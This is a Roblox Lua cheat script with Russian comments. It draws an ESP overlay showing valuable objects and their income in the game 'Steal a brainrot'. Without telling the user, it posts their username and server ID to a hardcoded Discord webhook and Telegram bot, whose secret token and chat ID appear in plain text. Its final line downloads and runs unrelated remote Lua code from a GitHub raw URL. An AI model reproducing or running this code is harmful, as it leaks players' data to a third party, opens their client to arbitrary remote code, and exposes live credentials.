local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

-- Конфигурация ESP
local ESP_SETTINGS = {
    UpdateInterval = 0.5,
    MaxDistance = 500,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    PartColors = {
        Color3.new(1, 1, 1),    -- Белый
        Color3.new(0.2, 0.6, 1),-- Синий
        Color3.new(1, 0.2, 0.2) -- Красный
    },
    SoundId = "rbxassetid://130785805",
    SoundVolume = 1.5,
    PlaySoundOnce = false
}

-- Настройки сканера
local SCANNER_SETTINGS = {
    ScanKey = Enum.KeyCode.F,
    DebounceTime = 3,
    IgnoreClasses = {"SurfaceAppearance", "Part"}
}

-- Настройки Discord Webhook (Main) и Telegram (Special)
local DISCORD_MAIN = {
    WebhookUrl = "https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz",
    Enabled = true,
    ImportantObjects = {
        ["Pot Hotspdddot"] = true,
        ["La Grande Combinasion"] = true,
        ["Garama and Madundung"] = true,
        ["Nuclearo Dinossauro"] = true,
        ["Dragon Cannelloni"] = true,
        ["Los Combinasionas"] = true,
        ["Los Hotspotsitos"] = true,
        ["Esok Sekolah"] = true,
        ["La Supreme Combinasion"] = true,
        ["Nooo My Hodsadadatspot"] = true,
        ["Ketupat Kepat"] = true,
        ["Nofddsfoo My Hotspot"] = true,
        ["Spaghetti Tualetti"] = true,
        ["Strawberry Elephant"] = true,
        ["Ketchuru and Musturu"] = true,
        ["La Kark7658erkar Combinasion"] = true,
        ["Tralaledon"] = true,
        ["Los Bros"] = true,
        ["La Extinct Grande"] = true,
        ["Los Chicleteiras"] = true,
        ["Las Sis"] = true,
        ["Tacorita Bicicleta"] = true,
        ["Tictac Sahur"] = true,
        ["Celularcini Visiosini"] = true,
        ["Los Primos"] = true,
        ["Tang Tang Keletang"] = true
    }
}

local TG_SPECIAL = {
    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
    ChatId = "-1002767532824",
    Enabled = true
}

-- Функция проверки прозрачности частей Cube.
local function checkCubeTransparency(obj)
    if not obj:IsA("Model") then return true end
    
    for _, part in ipairs(obj:GetDescendants()) do
        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
            print("Проверка: " .. part.Name .. " - прозрачность " .. part.Transparency)
            if part.Transparency > 0.40 then
                return false
            end
        end
    end
    return true
end

-- Доходы объектов (все значения в /s)
local OBJECT_INCOME = {
    ["La Vacca Saturno Saturnita"] = "250K/s",
    ["Chimpanzini Spiderini"] = "325K/s",
    ["Los Tralaleritos"] = "500K/s",
    ["Las Tralaleritas"] = "625K/s",
    ["Graipuss Medussi"] = "1M/s",
    ["Torrtuginni Dragonfrutini"] = "350K/s",
    ["Pot Hotspot"] = "2.5M/s",
    ["La Grande Combinasion"] = "10M/s",
    ["Garama and Madundung"] = "50M/s",
    ["Secret Lucky Block"] = "???/s",
    ["Dragon Cannelloni"] = "100M/s",
    ["Nuclearo Dinossauro"] = "15M/s",
    ["Las Vaquitas Saturnitas"] = "750K/s",
    ["Chicleteira Bicicleteira"] = "3.5M/s",
    ["Los Combinasionas"] = "15M/s",
    ["Agarrini la Palini"] = "425K/s",
    ["Los Hotspotsitos"] = "20M/s",
    ["Esok Sekolah"] = "30M/s",
    ["Karkerkar Kurkur"] = "275K/s",
    ["Job Job Job Sahur"] = "700K/s",
    ["La Supreme Combinasion"] = "40M/s",
    ["Nooo My Hotspot"] = "1.5M/s",
    ["Spaghetti Tualetti"] = "60M/s",
    ["Strawberry Elephant"] = "250M/s",
    ["Ketupat Kepat"] = "35M/s",
    ["Ketchuru and Musturu"] = "42.5M/s",
    ["Los Nooo My Hotssffsdsdpotsitos"] = "5M/s",
    ["La Kark767erkar Combinasion"] = "50M/s",
    ["Tralaledon"] = "27.5M/s",
    ["Los Bros"] = "24M/s",
    ["La Extinct Grande"] = "23.5M/s",
    ["Los Chicleteiras"] = "7M/s",
    ["Las Sis"] = "18M/s",
    ["Tacorita Bicicleta"] = "16.5M/s",
    ["Tictac Sahur"] = "37M/s",
    ["Celularcini Visiosini"] = "22.5M/s",
    ["Los Primos"] = "31M/s",
    ["Tang Tang Keletang"] = "33,5M/s"
}

-- Множители мутаций и трейтов
local MUTATION_MULTIPLIERS = {
    ["Rainbow"] = 10,
    ["Gold"] = 1.25,
    ["Diamond"] = 1.5,
    ["Bloodrot"] = 2,
    ["Candy"] = 4,
    ["Lava"] = 6,
    ["Galaxy"] = 6
}

local TRAIT_MULTIPLIERS = {
    ["Taco"] = 3,
    ["Claws"] = 5,
    ["Snowy"] = 3,
    ["Glitched"] = 5,
    ["Fire"] = 6,
    ["Fireworks"] = 6,
    ["Nyan"] = 6,
    ["Disco"] = 5,
    ["10B"] = 3,
    ["Zombie"] = 4,
    ["Shark Fin"] = 4,
    ["Bubblegum"] = 4,
    ["Cometstruck"] = 3.5,
    ["Galactic"] = 4,
    ["Explosive"] = 4,
    ["Paint"] = 6,
    ["Brazil"] = 6,
    ["Matteo Hat"] = 3.5,
    ["Rain"] = 1.5,
    ["UFO"] = 3,
    ["Skeleton"] = 4,
    ["Spider"] = 4.5,
    ["Sombrero"] = 5
}

-- Список объектов
local OBJECT_NAMES = {
    "La Vacca Saturno Saturnita",
    "Chimpanzini Spiderini",
    "Los Tralaleritos",
    "Las Tralaleritas",
    "Graipuss Medussi",
    "Torrtuginni Dragonfrutini",
    "Pot Hotspot",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Secret Lucksfsfsfy Block",
    "Dragon Cannelloni",
    "Nuclearo Dinossauro",
    "Las Vaquitas Saturnitas",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Agarrini la Palini",
    "Los Hotspotsitos",
    "Esok Sekolah",
    "Nooo My Hotspot",
    "La Supreme Combinasion",
    "Admin Lucky Block",
    "Ketupat Kepat",
    "Strawberry Elephant",
    "Spaghetti Tualetti",
    "Ketchuru and Musturu",
    "Los Nooo Mysffsfsf Hotspotsitos",
    "La Kark56656erkar Combinasion",
    "Los Bros",
    "Tralaledon",
    "La Extinct Grande",
    "Los Chicleteiras",
    "Las Sis",
    "Tacorita Bicicleta",
    "Tictac Sahur",
    "Celularcini Visiosini",
    "Los Primos",
    "Tang Tang Keletang"
}

-- Системные переменные
local camera = workspace.CurrentCamera
local espCache = {}
local lastUpdate = 0
local foundObjects = {}
local objectsToNotifyMain = {}
local objectsToNotifySpecial = {}
local lastScanTime = 0
local lastNotificationTimeMain = 0
local lastNotificationTimeSpecial = 0
local lastServerNotified = ""

-- Создаем интерфейс
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RussianESP"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false

-- Функции утилиты
local function getAccountInfo()
    local player = Players.LocalPlayer
    return player and player.Name or "Неизвестный аккаунт"
end

local function getServerId()
    local jobId = game.JobId
    return jobId ~= "" and jobId or "Одиночная игра"
end

local function incomeToNumber(incomeStr)
    if incomeStr == "???/s" then return 0 end
    
    local value = tonumber(incomeStr:match("%d+%.?%d*"))
    local unit = incomeStr:match("([MK])/s")
    
    if unit == "M" then
        return value * 1000000
    elseif unit == "K" then
        return value * 1000
    else
        return value
    end
end

local function formatIncomeNumber(num)
    if num >= 1000000 then
        local mValue = num/1000000
        return string.format(mValue % 1 == 0 and "%dM/s" or "%.1fM/s", mValue):gsub("%.0M/s", "M/s")
    elseif num >= 1000 then
        local kValue = num/1000
        return string.format(kValue % 1 == 0 and "%dK/s" or "%.1fK/s", kValue):gsub("%.0K/s", "K/s")
    else
        return string.format("%d/s", num)
    end
end

-- Функции для сбора информации об объектах
local function findMutation(obj)
    local mutation = obj:GetAttribute("Mutation")
    if mutation then return tostring(mutation) end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("StringValue") and child.Name == "Mutation" then
            return child.Value
        end
        
        if child:IsA("ObjectValue") and child.Name == "Mutation" and child.Value then
            return child.Value.Name
        end
    end
    
    local nameParts = obj.Name:split(" ")
    for _, part in ipairs(nameParts) do
        if MUTATION_MULTIPLIERS[part] then
            return part
        end
    end
    
    return nil
end

local function findTraits(obj)
    local traits = {}
    
    local traitsAttr = obj:GetAttribute("Traits")
    if traitsAttr then
        if type(traitsAttr) == "table" then
            for _, v in pairs(traitsAttr) do
                table.insert(traits, tostring(v))
            end
        else
            table.insert(traits, tostring(traitsAttr))
        end
    end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("StringValue") and (child.Name == "Trait" or child.Name == "Traits") then
            table.insert(traits, child.Value)
        end
    end
    
    for _, child in ipairs(obj:GetDescendants()) do
        if child:IsA("ObjectValue") and (child.Name == "Trait" or child.Name == "Traits") and child.Value then
            table.insert(traits, child.Value.Name)
        end
    end
    
    return traits
end

local function scanObject(obj)
    if not obj or not obj.Parent then return nil end
    
    -- Пропуск проверки прозрачности для "Garama and Madundung" и "La Supreme Combinasion"
    if obj.Name == "Garama and Madundung" or obj.Name == "La Supreme Combinasion" then
        print(obj.Name .. ": проверка прозрачности пропущена")
    else
        -- Проверка прозрачности только для частей Cube.
        if not checkCubeTransparency(obj) then
            print(obj.Name .. ": найдены части Cube с высокой прозрачностью (>0.40), уведомление не отправляется")
            return nil
        end
    end
    
    local mutation = findMutation(obj)
    local traits = findTraits(obj)
    local baseIncomeStr = OBJECT_INCOME[obj.Name] or "0/s"
    local baseIncome = incomeToNumber(baseIncomeStr)
    
    -- Раздельные множители
    local mutationMultiplier = 1
    local traitsMultiplier = 1
    local appliedMutation = {}
    local appliedTraits = {}

    -- Применяем множитель мутации
    if mutation and MUTATION_MULTIPLIERS[mutation] then
        mutationMultiplier = MUTATION_MULTIPLIERS[mutation]
        table.insert(appliedMutation, mutation.." (x"..MUTATION_MULTIPLIERS[mutation]..")")
    end

    -- Применяем множители трейтов
    for _, trait in ipairs(traits) do
        if TRAIT_MULTIPLIERS[trait] then
            traitsMultiplier = traitsMultiplier * TRAIT_MULTIPLIERS[trait]
            table.insert(appliedTraits, trait.." (x"..TRAIT_MULTIPLIERS[trait]..")")
        end
    end

    -- Рассчитываем итоговый доход (формула: base * mutation + base * (traits - 1))
    local finalIncome = baseIncome
    if baseIncomeStr ~= "???/s" then
        finalIncome = baseIncome * mutationMultiplier + baseIncome * (traitsMultiplier - 1)
    end

    return {
        name = obj.Name,
        mutation = mutation,
        traits = traits,
        baseIncome = baseIncomeStr,
        finalIncome = formatIncomeNumber(finalIncome),
        mutationMultiplier = mutationMultiplier,
        traitsMultiplier = traitsMultiplier,
        appliedMutation = appliedMutation,
        appliedTraits = appliedTraits,
        numericIncome = finalIncome
    }
end

local function createColoredText(objData)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0, 350, 0, 50)
    textLabel.BackgroundTransparency = 1
    textLabel.TextSize = ESP_SETTINGS.TextSize
    textLabel.Font = ESP_SETTINGS.Font
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextStrokeTransparency = 0.3
    
    local incomeText = objData.finalIncome ~= "???/s" and objData.finalIncome or "???"
    
    local richText = string.format(
        '%s %s: %s',
        objData.name, incomeText
    )
    
    -- Показываем мутации и трейты с их множителями
    if objData.mutation and MUTATION_MULTIPLIERS[objData.mutation] then
        richText = richText .. string.format(
            '\n%s x%.2f',
            objData.mutation, objData.mutationMultiplier
        )
    end
    
    if #objData.traits > 0 then
        richText = richText .. '\n'
        for _, trait in ipairs(objData.traits) do
            if TRAIT_MULTIPLIERS[trait] then
                richText = richText .. string.format('%s x%.2f ', trait, TRAIT_MULTIPLIERS[trait])
            else
                richText = richText .. trait .. ' '
            end
        end
    end
    
    textLabel.Text = richText
    textLabel.RichText = false
    return textLabel
end

local function createESPElement(obj)
    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
    if not rootPart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 350, 0, 80)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    
    local objData = scanObject(obj)
    local textLabel = createColoredText(objData)
    textLabel.Parent = billboard
    
    billboard.Adornee = rootPart
    billboard.Parent = screenGui
    
    return {
        labelGui = billboard,
        label = textLabel,
        rootPart = rootPart,
        object = obj,
        data = objData
    }
end

local function canSendNotification(botType)
    local currentServer = getServerId()
    local now = os.time()
    local lastNotificationTime = botType == "main" and lastNotificationTimeMain or lastNotificationTimeSpecial
    
    if currentServer == lastServerNotified and now - lastNotificationTime < 7 then
        return false
    end
    
    if botType == "main" then
        lastNotificationTimeMain = now
    else
        lastNotificationTimeSpecial = now
    end
    lastServerNotified = currentServer
    return true
end

-- Функция отправки в Discord Webhook (Main) - упрощенная версия без эмбедов
local function sendDiscordWebhook(message, isImportant)
    if not DISCORD_MAIN.Enabled or not request then return end
    
    local username = getAccountInfo()
    local serverId = getServerId()
    
    local success, result = pcall(function()
        return request({
            Url = DISCORD_MAIN.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = (isImportant and "@everyone " or "") .. message,
                username = "Brainrot ESP"
            })
        })
    end)
    
    if not success then
        warn("Ошибка отправки в Discord: " .. tostring(result))
    end
end

-- Функция отправки в Telegram (Special)
local function sendSpecialTelegramAlert()
    if not TG_SPECIAL.Enabled or not request or #objectsToNotifySpecial == 0 then return end
    if not canSendNotification("special") then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    
    local message = string.format(
        "Обнаружены объекты в Steal a brainrot\n"..
        "Игрок: %s\n"..
        "Сервер: %s\n"..
        "Время: %s\n\n"..
        "Объекты с низким доходом:\n",
        username, serverId, os.date("%X")
    )
    
    for _, objData in ipairs(objectsToNotifySpecial) do
        message = message .. string.format("%s (%s)", objData.name, objData.finalIncome)
        
        if #objData.traits > 0 then
            message = message .. " " .. table.concat(objData.traits, " ")
        end
        
        message = message .. "\n"
    end
    
    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\nТелепорт:\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')",
            serverId
        )
    end
    
    request({
        Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_SPECIAL.ChatId,
            text = message
        })
    })
end

local function sendMainDiscordAlert()
    if not DISCORD_MAIN.Enabled or #objectsToNotifyMain == 0 then return end
    if not canSendNotification("main") then return end
    
    local importantObjects = {}
    local regularObjects = {}
    
    for _, objData in ipairs(objectsToNotifyMain) do
        if DISCORD_MAIN.ImportantObjects[objData.name] then
            table.insert(importantObjects, objData)
        else
            table.insert(regularObjects, objData)
        end
    end
    
    local message = ""
    
    if #importantObjects > 0 then
        message = message .. "ВАЖНЫЕ ОБЪЕКТЫ:\n"
        for _, objData in ipairs(importantObjects) do
            message = message .. string.format("%s (%s)", objData.name, objData.finalIncome)
            
            if #objData.traits > 0 then
                message = message .. " " .. table.concat(objData.traits, " ")
            end
            
            message = message .. "\n"
        end
        message = message .. "\n"
    end
    
    if #regularObjects > 0 then
        message = message .. "Обычные объекты:\n"
        for _, objData in ipairs(regularObjects) do
            message = message .. string.format("%s (%s)", objData.name, objData.finalIncome)
            
            if #objData.traits > 0 then
                message = message .. " " .. table.concat(objData.traits, " ")
            end
            
            message = message .. "\n"
        end
    end
    
    if getServerId() ~= "Одиночная игра" then
        message = message .. string.format(
            "\nТелепорт:\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')",
            getServerId()
        )
    end
    
    sendDiscordWebhook(message, #importantObjects > 0)
end

local function playDetectionSound()
    local sound = Instance.new("Sound")
    sound.SoundId = ESP_SETTINGS.SoundId
    sound.Volume = ESP_SETTINGS.SoundVolume
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 3)
end

local function updateESP(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
    lastUpdate = 0

    -- Очистка кэша
    for obj, data in pairs(espCache) do
        if not obj.Parent or not data.rootPart.Parent then
            data.labelGui:Destroy()
            espCache[obj] = nil
            foundObjects[obj] = nil
        end
    end

    -- Сброс списков для уведомлений перед новым сканированием
    objectsToNotifyMain = {}
    objectsToNotifySpecial = {}

    -- Поиск объектов
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
            if not rootPart then continue end

            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
            if distance > ESP_SETTINGS.MaxDistance then
                if espCache[obj] then
                    espCache[obj].labelGui.Enabled = false
                end
                continue
            end

            local isNewObject = not foundObjects[obj]
            foundObjects[obj] = true

            if not espCache[obj] then
                espCache[obj] = createESPElement(obj)
                local objData = espCache[obj].data
                if objData then
                    playDetectionSound()
                    
                    -- Добавляем в соответствующий список для уведомлений
                    if DISCORD_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 25000000 then
                        table.insert(objectsToNotifyMain, objData)
                    else
                        table.insert(objectsToNotifySpecial, objData)
                    end
                end
            end

            -- Обновление видимости ESP
            local data = espCache[obj]
            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
            data.labelGui.Enabled = onScreen
        end
    end
    
    -- Отправка уведомлений (независимо друг от друга)
    if #objectsToNotifyMain > 0 then
        sendMainDiscordAlert()
    end
    
    if #objectsToNotifySpecial > 0 then
        sendSpecialTelegramAlert()
    end
end

-- Запуск системы
RunService.Heartbeat:Connect(updateESP)

-- Обработка игроков
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        updateESP(0)
    end)
end)

-- Обработчик клавиши сканера
UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == SCANNER_SETTINGS.ScanKey then
        local now = os.time()
        if now - lastScanTime < SCANNER_SETTINGS.DebounceTime then
            print("Подождите...")
            return
        end
        
        lastScanTime = now
        print("\nНачинаем сканирование всех объектов...")
        
        local foundCount = 0
        
        for _, obj in ipairs(workspace:GetDescendants()) do
            if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
                local details = scanObject(obj)
                if details then
                    foundCount = foundCount + 1
                    print("\n=== ОБЪЕКТ #"..foundCount.." ===")
                    print("Имя:", details.name)
                    print("Доход:", details.finalIncome)
                    if details.mutation then
                        print("Мутация:", details.mutation.." (x"..details.mutationMultiplier..")")
                    end
                    print("Traits ("..#details.traits.."):")
                    for i, trait in ipairs(details.traits) do
                        local multiplier = TRAIT_MULTIPLIERS[trait] and " (x"..TRAIT_MULTIPLIERS[trait]..")" or ""
                        print(i..".", trait..multiplier)
                    end
                end
            end
        end
        
        if foundCount == 0 then
            print("Объекты не найдены")
        else
            print("\n=== РЕЗУЛЬТАТ ===")
            print("Найдено объектов:", foundCount)
        end
    end
end)

-- Первоначальное сканирование
updateESP(0)

print("Steal a brainrot ESP System активирован!")
print("Отслеживается объектов: "..#OBJECT_NAMES)
print("ID сервера:", getServerId())
print("\nНажмите F для сканирования всех объектов")
loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
